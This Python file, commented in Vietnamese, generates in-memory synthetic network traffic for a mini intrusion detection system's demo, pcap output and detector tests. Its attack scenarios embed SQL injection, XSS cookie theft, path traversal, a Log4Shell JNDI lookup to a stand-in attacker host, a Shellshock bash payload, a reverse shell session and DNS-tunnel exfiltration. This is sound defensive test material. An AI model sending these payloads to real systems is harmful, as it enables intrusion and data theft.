"""Giả lập traffic mạng: nền "bình thường" + các kịch bản tấn công.

Mọi gói tin chỉ được DỰNG trong bộ nhớ (không gửi ra mạng) — dùng cho:
  * `mini-ids demo`     : chạy realtime để xem dashboard mà không cần Npcap/quyền admin
  * `mini-ids gen-pcap` : ghi ra file .pcap → mở bằng Wireshark để học xem tấn công trông ra sao
  * unit test           : kiểm tra từng detector bắt đúng kịch bản

Địa chỉ dùng dải tài liệu (RFC 5737: 198.51.100.0/24, 203.0.113.0/24) cho kẻ tấn công.
"""

from __future__ import annotations

import base64
import heapq
import itertools
import random
import string
import time
import zlib
from typing import Callable, Iterator

from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import ICMP, IP, TCP, UDP
from scapy.layers.l2 import ARP, Ether
from scapy.packet import Raw

GATEWAY = "192.168.1.1"
MACS = {
    GATEWAY: "00:11:22:33:44:01",
    "192.168.1.10": "00:11:22:33:44:10",   # web server nội bộ
    "192.168.1.20": "00:11:22:33:44:20",   # workstation
    "192.168.1.30": "00:11:22:33:44:30",   # workstation
    "192.168.1.40": "00:11:22:33:44:40",   # laptop
    "192.168.1.66": "00:11:22:33:44:66",   # máy nội bộ bị chiếm quyền
}
ATTACKER_MAC = "de:ad:be:ef:00:01"
CLIENTS = ["192.168.1.20", "192.168.1.30", "192.168.1.40"]
WEB_SERVER = "192.168.1.10"
SERVERS = ["142.250.66.78", "140.82.113.3", "157.240.199.35", "104.16.132.229",
           "13.107.42.14", "151.101.1.69", "20.205.243.166", "111.65.250.2"]
NORMAL_DOMAINS = ["www.google.com", "github.com", "api.github.com", "www.youtube.com",
                  "vnexpress.net", "zalo.me", "www.facebook.com", "outlook.office365.com",
                  "stackoverflow.com", "pypi.org", "docs.python.org", "tuoitre.vn"]

Timed = list[tuple[float, object]]


class TcpConv:
    """Dựng 1 cuộc hội thoại TCP với số seq/ack nhất quán (Wireshark hiển thị đẹp)."""

    def __init__(self, gen: "SyntheticTraffic", client: str, cport: int, server: str, sport: int):
        self.g, self.c, self.cp, self.s, self.sp = gen, client, cport, server, sport
        self.cseq = gen.rng.randrange(2**32)
        self.sseq = gen.rng.randrange(2**32)
        self.out: Timed = []

    def _pkt(self, t, from_client: bool, flags: str, data: bytes = b"") -> None:
        if from_client:
            p = self.g.ip(self.c, self.s) / TCP(sport=self.cp, dport=self.sp, flags=flags,
                                                   seq=self.cseq, ack=self.sseq if "A" in flags else 0)
        else:
            p = self.g.ip(self.s, self.c) / TCP(sport=self.sp, dport=self.cp, flags=flags,
                                                   seq=self.sseq, ack=self.cseq)
        if data:
            p = p / Raw(load=data)
        self.out.append((t, p))
        adv = len(data) + (1 if ("S" in flags or "F" in flags) else 0)
        if from_client:
            self.cseq = (self.cseq + adv) % 2**32
        else:
            self.sseq = (self.sseq + adv) % 2**32

    def handshake(self, t: float, rtt: float = 0.02) -> float:
        self._pkt(t, True, "S")
        self._pkt(t + rtt / 2, False, "SA")
        self._pkt(t + rtt, True, "A")
        return t + rtt

    def client(self, t, data: bytes, flags="PA"):
        self._pkt(t, True, flags, data)

    def server(self, t, data: bytes, flags="PA"):
        self._pkt(t, False, flags, data)

    def close(self, t: float, rtt: float = 0.02) -> float:
        self._pkt(t, True, "FA")
        self._pkt(t + rtt / 2, False, "FA")
        self._pkt(t + rtt, True, "A")
        return t + rtt

    def reset_by_server(self, t):
        self._pkt(t, False, "RA")


class SyntheticTraffic:
    def __init__(self, seed: int | None = 1337, start: float | None = None,
                 background_rate: float = 10.0):
        self.rng = random.Random(seed)
        self.start = time.time() if start is None else start
        self.background_rate = background_rate   # số "phiên" bình thường / giây
        self._seq = itertools.count()
        self.scenarios: dict[str, tuple[Callable[[float], Timed], list[str], str]] = {
            "portscan": (self.sc_portscan, ["portscan"], "Nmap SYN scan 120 port vào web server"),
            "stealth_scan": (self.sc_stealth_scan, ["portscan"], "Nmap XMAS / NULL / FIN scan"),
            "synflood": (self.sc_synflood, ["synflood"], "SYN flood từ IP giả mạo vào port 80"),
            "ping_sweep": (self.sc_ping_sweep, ["icmp"], "Máy nội bộ ping quét cả dải /24"),
            "icmp_flood": (self.sc_icmp_flood, ["icmp"], "Ping flood từ Internet"),
            "ssh_bruteforce": (self.sc_ssh_bruteforce, ["bruteforce"], "Hydra dò mật khẩu SSH"),
            "dns_tunnel": (self.sc_dns_tunnel, ["dns"], "Rò dữ liệu qua subdomain DNS (base32)"),
            "dga": (self.sc_dga, ["dns"], "Malware DGA: hàng loạt NXDOMAIN"),
            "arp_spoof": (self.sc_arp_spoof, ["arp"], "Đầu độc ARP giả làm gateway (MITM)"),
            "web_attacks": (self.sc_web_attacks, ["signatures"], "SQLi, XSS, path traversal, Log4Shell, sqlmap"),
            "c2_beacon": (self.sc_c2_beacon, ["beacon"], "Malware gọi về C2 mỗi 2 giây"),
            "reverse_shell": (self.sc_reverse_shell, ["signatures"], "Reverse shell ra port 4444"),
            "blacklist": (self.sc_blacklist, ["blacklist"], "Kết nối tới IP/domain trong blacklist"),
            "exfil": (self.sc_exfil, ["exfil"], "Đẩy ~6 MB ra máy lạ trên Internet"),
            "ftp_cleartext": (self.sc_ftp_cleartext, ["signatures"], "Đăng nhập FTP lộ mật khẩu"),
            "crypto_mining": (self.sc_crypto_mining, ["signatures"], "Kết nối Stratum mining pool"),
        }

    # ------------------------------------------------------------------ builders
    def ip(self, src: str, dst: str, ttl: int | None = None):
        src_mac = MACS.get(src, MACS[GATEWAY])
        dst_mac = MACS.get(dst, MACS[GATEWAY])
        if ttl is None:
            # Mỗi host ngoài có 1 TTL cố định (như thật: cùng hệ điều hành, cùng số hop).
            # TTL ngẫu nhiên theo từng gói sẽ khiến detector TTL bất thường báo nhầm hàng loạt.
            ttl = 64 if src in MACS else (52, 116, 118, 243)[zlib.crc32(src.encode()) % 4]
        return Ether(src=src_mac, dst=dst_mac) / IP(src=src, dst=dst, ttl=ttl)

    def eport(self) -> int:
        return self.rng.randint(49152, 65535)

    def dns_pair(self, t: float, client: str, qname: str, qtype: str = "A", rcode: int = 0,
                 answer: str | None = None) -> Timed:
        sport, qid = self.eport(), self.rng.randrange(65536)
        q = self.ip(client, GATEWAY) / UDP(sport=sport, dport=53) / DNS(
            id=qid, rd=1, qd=DNSQR(qname=qname, qtype=qtype))
        an = []
        if rcode == 0:
            if qtype == "TXT":
                an = DNSRR(rrname=qname, type="TXT", ttl=60, rdata="ok")
            else:
                an = DNSRR(rrname=qname, type="A", ttl=300, rdata=answer or self.rng.choice(SERVERS))
        r = self.ip(GATEWAY, client) / UDP(sport=53, dport=sport) / DNS(
            id=qid, qr=1, rd=1, ra=1, rcode=rcode, qd=DNSQR(qname=qname, qtype=qtype), an=an)
        return [(t, q), (t + self.rng.uniform(0.005, 0.03), r)]

    def arp_reply(self, t: float, ip: str, mac: str, to_ip: str) -> Timed:
        p = Ether(src=mac, dst=MACS.get(to_ip, "ff:ff:ff:ff:ff:ff")) / ARP(
            op=2, psrc=ip, hwsrc=mac, pdst=to_ip, hwdst=MACS.get(to_ip, "00:00:00:00:00:00"))
        return [(t, p)]

    # ------------------------------------------------------------------ nền bình thường
    def normal_session(self, t: float) -> Timed:
        r = self.rng.random()
        client = self.rng.choice(CLIENTS)
        if r < 0.45:
            return self.https_session(t, client, self.rng.choice(SERVERS))
        if r < 0.80:
            return self.dns_pair(t, client, self.rng.choice(NORMAL_DOMAINS))
        if r < 0.88:
            return self.http_internal(t, client)
        if r < 0.93:
            sport = self.eport()
            ntp = self.ip(client, "162.159.200.1") / UDP(sport=sport, dport=123) / Raw(b"\x23" + b"\x00" * 47)
            back = self.ip("162.159.200.1", client) / UDP(sport=123, dport=sport) / Raw(b"\x24" + b"\x01" * 47)
            return [(t, ntp), (t + 0.03, back)]
        if r < 0.97:
            req = Ether(src=MACS[client], dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=1, psrc=client, hwsrc=MACS[client], pdst=GATEWAY)
            return [(t, req)] + self.arp_reply(t + 0.002, GATEWAY, MACS[GATEWAY], client)
        ping = self.ip(client, GATEWAY) / ICMP(type=8, id=1, seq=self.rng.randint(1, 999)) / Raw(b"a" * 32)
        pong = self.ip(GATEWAY, client) / ICMP(type=0, id=1, seq=1) / Raw(b"a" * 32)
        return [(t, ping), (t + 0.001, pong)]

    def https_session(self, t: float, client: str, server: str) -> Timed:
        c = TcpConv(self, client, self.eport(), server, 443)
        t = c.handshake(t, rtt=self.rng.uniform(0.01, 0.06))
        c.client(t + 0.001, bytes(self.rng.getrandbits(8) for _ in range(self.rng.randint(200, 520))))
        t += 0.03
        for _ in range(self.rng.randint(2, 8)):
            t += self.rng.uniform(0.002, 0.02)
            c.server(t, b"\x17\x03\x03" + b"\x00" * self.rng.randint(400, 1400))
            c.client(t + 0.001, b"", flags="A")
        c.close(t + self.rng.uniform(0.05, 0.5))
        return c.out

    def http_internal(self, t: float, client: str) -> Timed:
        c = TcpConv(self, client, self.eport(), WEB_SERVER, 80)
        t = c.handshake(t, rtt=0.002)
        path = self.rng.choice(["/", "/products.php?id=3", "/login", "/static/app.css", "/api/items"])
        c.client(t + 0.001, f"GET {path} HTTP/1.1\r\nHost: intranet.local\r\n"
                            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n".encode())
        c.server(t + 0.01, b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n" + b"<html>ok</html>")
        c.close(t + 0.02, rtt=0.002)
        return c.out

    # ------------------------------------------------------------------ kịch bản tấn công
    def sc_portscan(self, t: float) -> Timed:
        attacker, out = "198.51.100.23", []
        ports = self.rng.sample(range(1, 1025), 120)
        for i, port in enumerate(ports):
            ts = t + i * 0.02
            sport = 40000 + i
            out.append((ts, self.ip(attacker, WEB_SERVER) / TCP(sport=sport, dport=port, flags="S", seq=1000)))
            flags = "SA" if port in (22, 80, 443) else "RA"
            out.append((ts + 0.002, self.ip(WEB_SERVER, attacker) / TCP(sport=port, dport=sport, flags=flags, ack=1001)))
        return out

    def sc_stealth_scan(self, t: float) -> Timed:
        attacker, out = "198.51.100.24", []
        for i, flags in enumerate(["FPU"] * 10 + [""] * 10 + ["F"] * 10):
            out.append((t + i * 0.05, self.ip(attacker, WEB_SERVER) /
                        TCP(sport=51000 + i, dport=self.rng.randint(1, 1024), flags=flags)))
        return out

    def sc_synflood(self, t: float) -> Timed:
        out = []
        for i in range(1500):
            src = f"{self.rng.randint(11, 223)}.{self.rng.randint(0, 255)}.{self.rng.randint(0, 255)}.{self.rng.randint(1, 254)}"
            out.append((t + i * 0.002, self.ip(src, WEB_SERVER) /
                        TCP(sport=self.rng.randint(1024, 65535), dport=80, flags="S", seq=self.rng.randrange(2**32))))
        return out

    def sc_ping_sweep(self, t: float) -> Timed:
        src, out = "192.168.1.66", []
        for i in range(2, 42):
            dst = f"192.168.1.{i}"
            out.append((t + i * 0.05, self.ip(src, dst) / ICMP(type=8, id=7, seq=i) / Raw(b"\x00" * 32)))
        return out

    def sc_icmp_flood(self, t: float) -> Timed:
        src, out = "203.0.113.50", []
        for i in range(600):
            out.append((t + i * 0.004, self.ip(src, WEB_SERVER) / ICMP(type=8, id=9, seq=i) / Raw(b"X" * 56)))
        out.append((t + 0.5, self.ip(src, WEB_SERVER) / ICMP(type=8, id=9, seq=9999) / Raw(b"P" * 1400)))
        return out

    def sc_ssh_bruteforce(self, t: float) -> Timed:
        attacker, out = "203.0.113.77", []
        for i in range(25):
            c = TcpConv(self, attacker, 42000 + i, WEB_SERVER, 22)
            ts = c.handshake(t + i * 0.4)
            c.server(ts + 0.01, b"SSH-2.0-OpenSSH_9.6\r\n")
            c.client(ts + 0.02, b"SSH-2.0-libssh_0.10.6\r\n")
            c.client(ts + 0.05, bytes(self.rng.getrandbits(8) for _ in range(120)))
            c.server(ts + 0.08, b"\x00\x00\x00\x0c\x0a\x33" + b"\x00" * 10)  # auth failure
            c.close(ts + 0.1)
            out += c.out
        return out

    def sc_dns_tunnel(self, t: float) -> Timed:
        client, out = "192.168.1.30", []
        secret = ("username=admin;password=Sup3rS3cret!;db=customers;" * 30).encode()
        chunks = [secret[i:i + 28] for i in range(0, len(secret), 28)]
        for i, chunk in enumerate(chunks[:60]):
            label = base64.b32encode(chunk).decode().rstrip("=").lower()
            qname = f"{label}.{i:04d}.t.data-sync.example"
            out += self.dns_pair(t + i * 0.08, client, qname, qtype="TXT")
        return out

    def sc_dga(self, t: float) -> Timed:
        client, out = "192.168.1.20", []
        for i in range(30):
            name = "".join(self.rng.choice(string.ascii_lowercase + string.digits) for _ in range(self.rng.randint(12, 20)))
            tld = self.rng.choice(["com", "net", "info", "biz", "xyz"])
            out += self.dns_pair(t + i * 0.1, client, f"{name}.{tld}", rcode=3)
        return out

    def sc_arp_spoof(self, t: float) -> Timed:
        out = []
        for i in range(12):
            victim = CLIENTS[i % len(CLIENTS)]
            out += self.arp_reply(t + i * 0.3, GATEWAY, ATTACKER_MAC, victim)
        return out

    def sc_web_attacks(self, t: float) -> Timed:
        attacker, out = "198.51.100.99", []
        requests = [
            "GET /products.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1",
            "GET /login.php?user=admin'%20OR%201=1--&pass=x HTTP/1.1",
            "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1",
            "GET /download.php?file=../../../../etc/passwd HTTP/1.1",
            "GET /api/items HTTP/1.1\r\nX-Api-Version: ${jndi:ldap://198.51.100.99:1389/Exploit}",
            "GET /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :; }; /bin/bash -c 'id'",
            "GET /index.php?id=1 HTTP/1.1\r\nUser-Agent: sqlmap/1.8.2#stable (https://sqlmap.org)",
        ]
        for i, req in enumerate(requests):
            c = TcpConv(self, attacker, 45000 + i, WEB_SERVER, 80)
            ts = c.handshake(t + i * 0.4)
            head = req if "User-Agent" in req else req + "\r\nUser-Agent: Mozilla/5.0"
            c.client(ts + 0.01, f"{head}\r\nHost: intranet.local\r\n\r\n".encode())
            c.server(ts + 0.03, b"HTTP/1.1 403 Forbidden\r\n\r\n")
            c.close(ts + 0.05)
            out += c.out
        return out

    def sc_c2_beacon(self, t: float) -> Timed:
        client, c2, out = "192.168.1.20", "203.0.113.200", []
        start = t
        for i in range(9):
            if i:
                start += 2.0 * self.rng.uniform(0.98, 1.02)   # chu kỳ 2s, jitter ±2%
            c = TcpConv(self, client, self.eport(), c2, 8443)
            ts = c.handshake(start, rtt=0.08)
            c.client(ts + 0.01, b"\x17\x03\x03\x00\x40" + bytes(64))
            c.server(ts + 0.09, b"\x17\x03\x03\x00\x20" + bytes(32))
            c.close(ts + 0.1, rtt=0.08)
            out += c.out
        return out

    def sc_reverse_shell(self, t: float) -> Timed:
        c = TcpConv(self, "192.168.1.66", self.eport(), "203.0.113.44", 4444)
        ts = c.handshake(t, rtt=0.1)
        c.client(ts + 0.2, b"Microsoft Windows [Version 10.0.26200]\r\nC:\\Users\\victim>")
        c.server(ts + 0.6, b"whoami\n")
        c.client(ts + 0.7, b"desktop-lab\\victim\r\n")
        return c.out

    def sc_blacklist(self, t: float) -> Timed:
        client = "192.168.1.40"
        out = self.dns_pair(t, client, "update.malware-c2.example", answer="203.0.113.66")
        c = TcpConv(self, client, self.eport(), "203.0.113.66", 443)
        ts = c.handshake(t + 0.1, rtt=0.12)
        c.client(ts + 0.01, bytes(200))
        c.close(ts + 0.3)
        return out + c.out

    def sc_exfil(self, t: float) -> Timed:
        c = TcpConv(self, "192.168.1.30", self.eport(), "198.51.100.200", 443)
        ts = c.handshake(t, rtt=0.05)
        block = bytes(40000)
        for i in range(150):
            c.client(ts + i * 0.02, block)
            if i % 10 == 9:
                c.server(ts + i * 0.02 + 0.01, b"", flags="A")
        c.close(ts + 3.1)
        return c.out

    def sc_ftp_cleartext(self, t: float) -> Timed:
        c = TcpConv(self, "192.168.1.20", self.eport(), "203.0.113.21", 21)
        ts = c.handshake(t, rtt=0.05)
        c.server(ts + 0.05, b"220 FTP server ready\r\n")
        c.client(ts + 0.2, b"USER admin\r\n")
        c.server(ts + 0.25, b"331 Password required\r\n")
        c.client(ts + 0.5, b"PASS hunter2\r\n")
        c.server(ts + 0.55, b"230 Login successful\r\n")
        c.close(ts + 0.8)
        return c.out

    def sc_crypto_mining(self, t: float) -> Timed:
        c = TcpConv(self, "192.168.1.40", self.eport(), "203.0.113.150", 3333)
        ts = c.handshake(t, rtt=0.1)
        c.client(ts + 0.01, b'{"id":1,"method":"mining.subscribe","params":["xmrig/6.21.0"]}\n')
        c.server(ts + 0.15, b'{"id":1,"result":[[["mining.notify","ae6812eb4cd7735a302a8a9dd95cf71f"]]],"error":null}\n')
        c.client(ts + 0.2, b'{"id":2,"method":"mining.authorize","params":["wallet.worker","x"]}\n')
        return c.out

    # ------------------------------------------------------------------ dòng thời gian
    def timeline(self, duration: float | None = None, warmup: float = 30.0, gap: float = 8.0,
                 scenarios: list[str] | None = None, loop: bool = False) -> Iterator[object]:
        """Sinh gói tin theo thứ tự thời gian: warmup chỉ có traffic thường, sau đó lần lượt
        từng kịch bản tấn công cách nhau `gap` giây (lặp lại nếu loop=True)."""
        names = list(self.scenarios) if scenarios is None else list(scenarios)
        heap: list[tuple[float, int, object]] = []
        t_bg = self.start
        # Máy trong LAN hỏi ARP gateway ngay từ đầu → IDS học đúng MAC thật của gateway
        for i, client in enumerate(CLIENTS):
            for ts, p in self.arp_reply(self.start + 0.01 * i, GATEWAY, MACS[GATEWAY], client):
                heapq.heappush(heap, (ts, next(self._seq), p))
        plan = ((self.start + warmup + i * gap, name)
                for i, name in enumerate(itertools.cycle(names) if loop else names))
        next_attack = next(plan, None)
        end = None if duration is None else self.start + duration
        if end is None and not loop:
            end = self.start + warmup + len(names) * gap + 20

        while True:
            frontier = heap[0][0] if heap else t_bg
            while t_bg <= frontier or not heap:
                for ts, p in self.normal_session(t_bg):
                    heapq.heappush(heap, (ts, next(self._seq), p))
                t_bg += self.rng.expovariate(self.background_rate)
                frontier = heap[0][0]
            while next_attack is not None and next_attack[0] <= heap[0][0]:
                start, name = next_attack
                for ts, p in self.scenarios[name][0](start):
                    heapq.heappush(heap, (ts, next(self._seq), p))
                next_attack = next(plan, None)
            ts, _, pkt = heapq.heappop(heap)
            if end is not None and ts > end:
                return
            pkt.time = ts
            yield pkt
